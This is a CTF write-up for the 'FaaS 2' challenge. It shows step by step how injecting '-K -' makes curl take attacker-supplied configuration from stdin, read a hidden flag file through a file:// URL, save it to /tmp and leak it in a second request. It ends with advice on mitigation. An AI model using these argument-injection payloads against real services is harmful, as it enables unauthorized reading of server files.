**Pwn/FaaS 2**

**Challenge**

**RCE time, right?**

**Solution**

The service takes a host, validates it, and passes it to curl. Spaces are allowed, so we can inject additional curl arguments.

Important words such as `file` and `self`, as well as the digit `1`, are blocked. Rather than trying to bypass every blocked word, we can make curl read more options from a place the filter never checks.

The payload is:

```text
example.com -K -
```

`-K -` tells curl to read a configuration from stdin. Since the service is running behind socat, curl's stdin is our TCP connection. Anything sent after the host line becomes curl configuration without passing through the host validator.

Closing the connection is required for curl to finish reading the configuration, but socat closes the process before we can receive its output. The workaround is to save the result to a temporary file and retrieve it with a second connection.

Reading PID 1's command line reveals the hidden filename:

```text
EXEC:"./secretbinary1337 `cat what_even_is_this_file_name.txt`,stderr"
```

On the first connection, we send:

```text
example.com -K -

next
url = "file:///srv/what_even_is_this_file_name.txt"
output = "/tmp/gg"
```

This writes the flag to `/tmp/gg`. On a new connection, we retrieve it with:

```text
example.com -r 0-43 -w @/tmp/gg
```

The range request leaves an open HTML `<title>` tag, and `-w @/tmp/gg` appends the flag to it, making the flag appear in the title printed by the service.

No RCE was needed in the end; curl argument injection was enough.

**Flag**

**scriptCTF{bru73f0rc1ng_pr0c3ss_1d5????_259e2a93c473}**

## Security Impact and Mitigation

This is an argument-injection vulnerability rather than conventional shell metacharacter injection. The application validated only the apparent host string, but curl interpreted the remaining tokens as options. `-K -` was especially powerful because it moved the second-stage instructions to stdin, outside the validator's view.

The two-connection design was necessary because curl waits for EOF before processing all stdin configuration, while the socat wrapper terminates the process at connection close. Persisting the first response to `/tmp/gg` decoupled file acquisition from exfiltration; the second request used curl's write-out behavior to place the saved data inside output parsed by the service.

A robust fix is to avoid command construction, invoke a networking library directly, restrict schemes and destinations, and ensure subprocesses receive an immutable argument array with `--` before untrusted values. Temporary files should also be isolated per request and created with unpredictable names and restrictive permissions.
